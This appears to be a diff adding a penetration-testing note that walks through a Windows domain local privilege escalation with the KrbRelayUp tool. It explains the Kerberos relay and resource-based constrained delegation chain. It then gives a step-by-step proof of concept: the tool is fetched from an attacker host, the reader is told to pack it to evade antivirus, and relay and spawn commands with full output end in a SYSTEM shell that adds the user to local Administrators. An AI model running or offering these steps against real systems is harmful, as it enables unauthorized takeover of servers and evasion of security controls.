@@ -1,0 +1,165 @@
+=======================================================================================================================
+Windows local privilege escalation example - KrbRelayUp (Kerberos Relay Attack + RBCD method)
+=======================================================================================================================
+
+=> https://github.com/Dec0ne/KrbRelayUp
+=> https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9
+
+KrbRelayUp is a wrapper around some of the features of Rubeus and KrbRelay (and a few other tools) in order to streamline the abuse of the following
+attack primitive:
+1. New machine account creation (New-MachineAccount with an SPN set)
+2. Local machine account authentication coercion (using KrbRelay)
+3. Kerberos relay to LDAP (using KrbRelay)
+4. Add Resource-based constrained (RBCD) privileges and obtain a privileged Silver Ticket (ST) to local machine (using Rubeus)
+5. Using said Silver Ticket (ST) to authenticate to local Service Manager and create a new service as NT/SYSTEM (using SCMUACBypass)
+
+This is essentially a universal no-fix local privilege escalation in windows domain environments where LDAP signing is not enforced (the default settings).
+
+Explanations
+-------------
+> Kerberos Relay Attack adds a fake (or owned) computer account to the target's msDS-AllowedToActOnBehalfOfOtherIdentity attribute, making it possible 
+  to perform a Resource-Based Constrained Delegation Attack against the target. The result of the RBCD attack is an access to the target with a Silver Ticket, 
+  which can be used for local admin access remotely or even locally (meaning privilege escalation) by patching the Win32 Service Control Manager to use
+  Kerberos Authentication locally.
+
+Reminder about RBCD and Silver ticket attacks
+---------------------------------------------
+> Machine accounts can edit their own msDS-AllowedToActOnBehalfOfOtherIdentity attribute, hence allowing Resource-based constrained (RBCD) attacks on relayed
+  machine accounts authentications.   
+  For this attack to work, the attacker needs to populate the target attribute with an account having a ServicePrincipalName set (needed for Kerberos delegation operations).
+  The usual way to conduct these attacks is to create a computer account, which comes with an SPN set. 
+  This is usually possible thanks to a domain-level attribute called MachineAccountQuota that allows regular users to create up to 10 computer accounts. 
+  While this "computer account creation + RBCD attack" is the most common exploitation path, doing so with a user account (having at least one SPN) is perfectly
+  feasible.
+  Then, in order to abuse this, the attacker has to control the account the object's attribute has been populated with (i.e. the account that has an SPN). 
+  Using that account's credentials, the attacker can obtain a ticket through S4U2Self and S4U2Proxy requests, just like constrained delegation with protocol transition.
+  In the end, an RBCD abuse results in a Service Ticket to authenticate on a target service on behalf of a user. 
+  Once the final Service Ticket is obtained, it can be used with Pass-the-Ticket to access the target service. 
+> A Silver ticket attack is based on crafting a valid TGS for a service once the NTLM hash of the service is owned (like the PC account hash).
+
+
+==================================================================================================================================
+PoC 1 - Local privilege escalation on a Windows Server 2016 (fully patched) using the tool KrbRelayUP and the RBDCD method 
+==================================================================================================================================
+
+Step 1 - We are logged on a Windows server 2016 with a low privileged user (only member of the "Remote Desktop Users" group)
+-------------------------------------------------------------------------------------------------------------------------------
+
+C:\Users\auditor> hostname
+Oracleserver1
+
+C:\Users\auditor> net user auditor /domain
+The request will be processed at a domain controller for domain company.work.
+
+User name                    auditor
+Full Name                    auditor
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/1/2023 8:28:59 PM
+Password expires             2/12/2023 8:28:59 PM
+Password changeable          1/2/2023 8:28:59 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   1/1/2023 10:01:32 PM
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Domain Users
+The command completed successfully.
+
+C:\Users\auditor>
+
+
+Step 2 - Upload the tool KrbRelayUp.exe on the target Windows server 2016
+-------------------------------------------------------------------------------------
+
+Note: you need to 'pack' the tool to avoid AV detection.
+
+PS C:\temp> wget -Uri http://192.168.1.30:8080/KrbRelayUP.exe -OutFile KrbRelayUP.exe
+
+
+Step 3 - Perform the KrbRelayUp attack in 2 phases: 'Relay' and 'Spawn'
+--------------------------------------------------------------------------------------
+
+Attack phase 1 'RELAY'
+-----------------------
+=> KrbRelayUP will Coerce a Kerberos authentication from the local machine account, relay it to LDAP (AD) and create a control primitive over the local machine
+   using a RBCD.
+
+C:\temp>KrbRelayUP.exe relay -Domain company.work -CreateNewComputerAccount -ComputerName Pentesterhost$ -ComputerPassword Welcome2022
+
+KrbRelayUp - Relaying you to SYSTEM
+
+[+] Rewriting function table
+[+] Rewriting PEB
+[+] Init COM server
+[+] Computer account "Pentesterhost$" added with password "Welcome2022"
+[+] Register COM server
+[+] Forcing SYSTEM authentication
+[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...
+[+] LDAP session established
+[+] RBCD rights added successfully
+[+] Run the spawn method for SYSTEM shell:
+    ./KrbRelayUp.exe spawn -m rbcd -d company.work -dc DC1.company.work -cn Pentesterhost$ -cp Welcome2022
+
+
+Attack phase 2 'SPAWN'
+-----------------------
+=> KrbRelayUP will will use the appropriate control primitive to obtain a Kerberos Service Ticket and will use it to create a new service running as SYSTEM.
+
+C:\temp>KrbRelayUp.exe spawn -m rbcd -d company.work -dc DC1.company.work -cn Pentesterhost$ -cp Welcome2022
+
+KrbRelayUp - Relaying you to SYSTEM
+
+[+] TGT request successful!
+[+] Building S4U2self
+[+] Using domain controller: DC1.company.work (2a01:e34:ec47:9ed0:58ed:b6e6:edab:8b9e)
+[+] Sending S4U2self request to 2a01:e34:ec47:9ed0:58ed:b6e6:edab:8b9e:88
+[+] S4U2self success!
+[+] Got a TGS for 'Administrator' to 'Pentesterhost$@COMPANY.WORK'
+[+] Impersonating user 'Administrator' to target SPN 'HOST/ORACLESERVER1'
+[+] Building S4U2proxy request for service: 'HOST/ORACLESERVER1'
+[+] Using domain controller: DC1.company.work (2a01:e34:ec47:9ed0:58ed:b6e6:edab:8b9e)
+[+] Sending S4U2proxy request to domain controller 2a01:e34:ec47:9ed0:58ed:b6e6:edab:8b9e:88
+[+] S4U2proxy success!
+[+] Ticket successfully imported!
+[+] Using ticket to connect to Service Manger
+[+] AcquireCredentialsHandleHook called for package N
+[+] Changing to Kerberos package
+[+] InitializeSecurityContextHook called for target H
+[+] InitializeSecurityContext status = 0x00090312
+[+] InitializeSecurityContextHook called for target H
+[+] InitializeSecurityContext status = 0x00000000
+[+] KrbSCM Service created
+[+] KrbSCM Service started
+[+] Clean-up done
+
+C:\temp>
+
+
+Step 4 - We have now full control over the Windows server (i.e. SYSTEM privs)
+------------------------------------------------------------------------------
+
+=> A command shell prompt running as 'nt authority\system' popped up :-)
+
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>hostname
+Oracleserver1
+
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32> net localgroup Administrators auditor /add
+<SNIP>
